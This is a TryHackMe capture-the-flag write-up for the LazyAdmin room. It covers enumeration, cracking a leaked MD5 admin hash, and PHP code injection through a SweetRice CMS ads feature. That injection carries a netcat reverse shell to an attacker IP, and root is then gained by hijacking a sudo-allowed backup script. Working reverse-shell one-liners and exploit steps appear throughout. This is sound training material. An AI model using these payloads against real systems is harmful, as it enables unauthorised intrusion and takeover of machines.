# TryHackMe: LazyAdmin; Linux-Based CTF

[LazyAdmin](https://tryhackme.com/room/lazyadmin) is an easy linux-based CTF from TryHackMe.

## Task 1

### 1. What is the user flag?

#### Nmap Enumeration

After running `nmap`, we can see there are 2 open ports: `22`, `SSH 7.2p2`; `80`, `HTTP on Apache 2.4.18`.

```
kali@kali:~/Desktop/TryHackMe/lazyadmin$ nmap -A target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 15:48 EDT
Nmap scan report for 10.10.221.127
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds
```

#### Browsing to site

Nothing revealed on homepage; just default Apache page.
No robots, and no sitemap.
Lets try further enumeration with GoBuster.

#### File/Directory enumeration

After the first GoBuster run, directory `/content` is revealed. Which contains a badly setup CMS, powered by `Basic-CMS.org`.
The wordlist used is from `seclists`, which you can `apt-get install`. The same list is avaliable by default on Kali under `/usr/share/wordlists/dirbuster/directory.......`

```
kali@kali:~/Desktop/TryHackMe/lazyadmin$ gobuster dir --url http://target.thm/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100                                                   
===============================================================                                            
Gobuster v3.0.1                                                                                            
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                            
===============================================================                                            
[+] Url:            http://10.10.221.127/                                                                  
[+] Threads:        100                                                                                    
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt                
[+] Status codes:   200,204,301,302,307,401,403                                                            
[+] User Agent:     gobuster/3.0.1                                                                         
[+] Timeout:        10s
===============================================================
2020/09/12 15:55:34 Starting gobuster
===============================================================
/content (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/12 15:57:16 Finished
===============================================================
```

On the second GoBuster ran, the target URL had `/content` appended, which revealed more folders. These folders are not protected and allowed directory traversal.

```
kali@kali:~/Desktop/TryHackMe/lazyadmin$ gobuster dir --url http://target.thm/content -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target.thm/content
[+] Threads:        100
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/12 15:57:28 Starting gobuster
===============================================================
/images (Status: 301)
/js (Status: 301)
/inc (Status: 301)
/as (Status: 301)
/_themes (Status: 301)
/attachment (Status: 301)
===============================================================
2020/09/12 15:59:52 Finished
===============================================================
```


#### Digging into the enumerated directories

Explored some of the directories from the second `gobuster` execution. Found `http://10.10.221.127/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql`. MySQL backups may contain credentials that are repeated and exploitable against the SSH service open on port 22. Also downloaded some file `cache.db` that contained hex, and converted to ASCII too see if any sensitive data. 

The MYSQL file contains a well hidden serialized javascript object, which contains a value next to 'passwd'

```
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',

```

After decyphering the text, got more usable data, which lends a pointer towards the username too.

```
a:17:{s:4:"name";
s:25:"Lazy Admin&#039;
s Website";
s:6:"author";
s:10:"Lazy Admin";
s:5:"title";
s:0:"";
s:8:"keywords";
s:8:"Keywords";
s:11:"description";
s:11:"Description";
s:5:"admin";
s:7:"manager";
s:6:"passwd";
s:32:"42f749ade7f9e195bf475f37a44cafcb";
s:5:"close";i:1;
s:9:"close_tip";
```
Admin username looks like `manager`
Password looks like `42f749ade7f9e195bf475f37a44cafcb`

Lets see if can ID and crack the hash. Using some software determined it's probably MD5. So testing with `hashcat`.

```
kali@kali:~/Desktop/TryHackMe/lazyadmin$ hashcat -a 0 -m 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz, 2890/2954 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

42f749ade7f9e195bf475f37a44cafcb:Password123     
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 42f749ade7f9e195bf475f37a44cafcb
Time.Started.....: Sat Sep 12 16:55:43 2020 (0 secs)
Time.Estimated...: Sat Sep 12 16:55:43 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   880.1 kH/s (0.68ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 36864/14344385 (0.26%)
Rejected.........: 0/36864 (0.00%)
Restore.Point....: 32768/14344385 (0.23%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: dyesebel -> holaz

Started: Sat Sep 12 16:55:37 2020
Stopped: Sat Sep 12 16:55:45 2020

```

The hash is cracked, lets try login. 

### Succesful login

After succesful login, turned the site 'on'. As mentioned on the homepage. Hopefully this way we can return some malicious code. Potentially a PHP reverse shell. Though note, there is a MYSql execute option which can test after if can't execute malicious code.

### Ads code

Found that "ads" can be added to the site. Lets test some rogue PHP script.

```
<?php echo 1+1; ?>
```

On saving, site generates some JS code. Navigating to the SRC of the script created returns:
```
<!--
	document.write('2');
//-->
```

Looks like PHP code is executed here, as the `1+1` was calculated. 

Lets test some other PHP, we can get shell with this. 

First listen on attacker machine with `nc -lvp 4444`. Then inject the following PHP code for reverse netcat shell.

```
<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.219 4444 >/tmp/f");
```

On navigating to the generated ad's src script, we achieve shell, as the PHP executed.

```
kali@kali:~/Desktop/TryHackMe/lazyadmin$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.11.8.219] from target.thm [10.10.221.127] 53918
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

We can than find the user flag in `/home/itguy/user.txt`. 

### 2. What is the root flag?

We can also `cat mysql_login.txt`, and reveal some credentials for the MySQL server.

`rice:randompass`

There also a Perl script in `/home/itguy` called `/backup.pl`. Which has an interesting interacting with `/etc/copy.sh`.

On running `sudo -l` we see it has root privileges.

```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

And for some reason, `/etc/copy.sh` has an reverse shell running out of it???

Created a reverse shell in the `/var/html/www/content` directory where user has shell access.

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.219 4442 >/tmp/f" >> /var/www/html/content/test.sh
```

Now to get `/home/itguy/backup.pl` to run the shell.. We can't `echo` to `backup.pl` directly, so instead we can try exploit the file it calls: `/etc/copy.sh`. 

Preferably removing the old reverse shell that's already in there...

```
echo "sh /var/www/html/content/test.sh" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

We get shell on our other netcate listening on 4442.

```
kali@kali:~/Scripts/Python$ nc -lvp 4442
listening on [any] 4442 ...
connect to [10.11.8.219] from target.thm [10.10.221.127] 55646
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Giving us root.

As for the flag, we can get it from `/root/root.txt`.



